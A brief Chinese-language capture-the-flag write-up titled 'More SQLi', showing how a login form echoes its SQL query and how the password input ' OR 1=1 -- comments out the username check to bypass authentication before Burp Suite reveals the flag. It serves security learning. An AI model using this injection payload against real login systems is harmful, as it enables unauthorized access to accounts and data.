# More SQLi

* 帳號密碼先出輸入admin
* 隨後出現
  
```html
username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
```

* 之後在帳號打admin密碼'OR 1=1 -- 使SQL語言變成

```sql
SELECT id FROM users WHERE password = ''OR 1=1 -- AND username = 'admin'
```

-- 是註解將AND username = 'admin'為註解

* 用Burp Suite追蹤後即可找到flag